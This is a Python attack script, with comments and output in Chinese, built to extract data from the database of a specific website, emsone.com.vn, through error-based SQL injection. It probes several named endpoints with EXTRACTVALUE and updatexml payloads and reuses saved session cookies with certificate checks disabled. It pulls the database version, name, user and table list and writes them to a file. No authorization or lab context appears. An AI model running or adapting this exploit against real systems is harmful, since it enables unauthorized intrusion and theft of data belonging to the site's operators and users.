#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import re
import urllib3
urllib3.disable_warnings()

class DatabaseExtractorV2:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.db_info = {}
        self.working_endpoint = None
        self.working_param = None
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def find_working_endpoint(self):
        """查找可用的SQL注入端点"""
        print("[*] 查找可用SQL注入端点...")
        
        test_payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST123'), 0x7e))--"
        
        endpoints = [
            ('/Account/GetUserInfo', 'id'),
            ('/Handle/SearchListProvince', 'Type'),
            ('/Handle/SearchListWardByDistrictID', 'DistrictID'),
            ('/Handle/SearchListCustomer', 'q'),
            ('/Handle/SearchListWareHouse', 'id'),
            ('/Handle/SearchListProductVariantByWareHouseID', 'WareHouseID'),
        ]
        
        for endpoint, param in endpoints:
            url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(test_payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if 'TEST123' in r.text or ('XPATH' in r.text.upper() and 'TEST123' in r.text):
                    print(f"    [+] 找到可用端点: {endpoint} [参数: {param}]")
                    self.working_endpoint = endpoint
                    self.working_param = param
                    return True
            except:
                pass
        
        return False
    
    def extract_value(self, query, label):
        """提取单个值"""
        if not self.working_endpoint:
            return None
        
        print(f"\n[*] 提取: {label}")
        payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
        url = f"{self.base_url}{self.working_endpoint}?{self.working_param}={urllib.parse.quote(payload)}"
        
        try:
            r = self.session.get(url, timeout=10)
            # 提取XPATH错误中的值
            match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
            if match:
                value = match.group(1)
                print(f"    [+] {label}: {value}")
                return value
            else:
                # 检查是否直接在响应中
                if query.lower() in r.text.lower() or 'version' in r.text.lower():
                    print(f"    [!] 可能在响应中，检查完整响应")
        except Exception as e:
            print(f"    [-] Error: {e}")
        return None
    
    def extract_with_updatexml(self, query, label):
        """使用updatexml提取"""
        if not self.working_endpoint:
            return None
        
        print(f"\n[*] 提取 (updatexml): {label}")
        payload = f"1' AND updatexml(1, CONCAT(0x7e, ({query}), 0x7e), 1)--"
        url = f"{self.base_url}{self.working_endpoint}?{self.working_param}={urllib.parse.quote(payload)}"
        
        try:
            r = self.session.get(url, timeout=10)
            match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
            if match:
                value = match.group(1)
                print(f"    [+] {label}: {value}")
                return value
        except:
            pass
        return None
    
    def extract_with_substring(self, query, label, max_len=200):
        """分段提取"""
        if not self.working_endpoint:
            return None
        
        print(f"\n[*] 分段提取: {label}")
        result = ""
        
        for i in range(1, max_len, 30):
            substring_query = f"SUBSTRING(({query}), {i}, 30)"
            payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({substring_query}), 0x7e))--"
            url = f"{self.base_url}{self.working_endpoint}?{self.working_param}={urllib.parse.quote(payload)}"
            
            try:
                r = self.session.get(url, timeout=10)
                match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                if match:
                    chunk = match.group(1)
                    if chunk and len(chunk) > 0:
                        result += chunk
                        print(f"    [+] 片段 {i}: {chunk}")
                    else:
                        break
                else:
                    break
            except:
                break
        
        if result:
            print(f"    [+] 完整: {result[:200]}")
            return result
        return None
    
    def run_all(self):
        """执行提取"""
        print("="*60)
        print("数据库提取 V2")
        print("="*60)
        
        if not self.find_working_endpoint():
            print("[-] 未找到可用端点，尝试直接提取...")
            # 使用已知端点
            self.working_endpoint = '/Account/GetUserInfo'
            self.working_param = 'id'
        
        # 提取基础信息
        self.db_info['version'] = self.extract_value("SELECT version()", "数据库版本")
        self.db_info['database'] = self.extract_value("SELECT database()", "数据库名")
        self.db_info['user'] = self.extract_value("SELECT user()", "当前用户")
        
        # 如果EXTRACTVALUE失败，尝试updatexml
        if not self.db_info['version']:
            self.db_info['version'] = self.extract_with_updatexml("SELECT version()", "数据库版本")
        
        # 提取表名
        if self.db_info.get('database'):
            tables = self.extract_with_substring(
                "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()",
                "表名列表",
                max_len=500
            )
            if tables:
                self.db_info['tables'] = tables.split(',')
        
        # 保存结果
        with open('database_extracted.json', 'w', encoding='utf-8') as f:
            json.dump(self.db_info, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 提取完成")

if __name__ == "__main__":
    extractor = DatabaseExtractorV2()
    extractor.run_all()